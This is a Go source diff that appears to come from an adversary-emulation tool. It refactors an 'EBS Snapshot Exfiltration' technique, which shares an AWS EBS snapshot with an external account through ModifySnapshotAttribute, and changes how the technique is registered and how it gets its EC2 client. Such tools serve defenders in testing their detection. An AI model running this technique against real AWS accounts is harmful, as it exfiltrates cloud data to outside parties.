@@ -15,25 +15,23 @@ import (
 //go:embed main.tf
 var tf []byte
 
-func init() {
-	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
-		ID:                 "aws.exfiltration.ebs-snapshot-shared-with-external-account",
-		FriendlyName:       "EBS Snapshot Exfiltration",
-		Platform:           stratus.AWS,
-		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
-		Description: `
+var ebsSnapshotShare = &stratus.AttackTechnique{
+	ID:                 "aws.exfiltration.ebs-snapshot-shared-with-external-account",
+	FriendlyName:       "EBS Snapshot Exfiltration",
+	Platform:           stratus.AWS,
+	MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
+	Description: `
 Exfiltrates an EBS snapshot by sharing it with an external AWS account.
 
 Warm-up: Creates an EBS volume and a snapshot.
 Detonation: Calls ModifySnapshotAttribute to share the snapshot.
 `,
-		PrerequisitesTerraformCode: tf,
-		Detonate:                   detonate,
-	})
+	PrerequisitesTerraformCode: tf,
+	Detonate:                   detonate,
 }
 
-func detonate(params map[string]string) error {
-	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
+func detonate(params map[string]string, provider providers.StratusProvider) error {
+	var ec2Client *ec2.Client = provider.GetAwsProvider().EC2Client()
 
 	// Find the snapshot to exfiltrate
 	ourSnapshotId := params["snapshot_id"]
@@ -49,4 +47,8 @@ func detonate(params map[string]string) error {
 		},
 	})
 	return err
+}
+
+func init() {
+	stratus.GetRegistry().RegisterAttackTechnique(ebsSnapshotShare)
 }
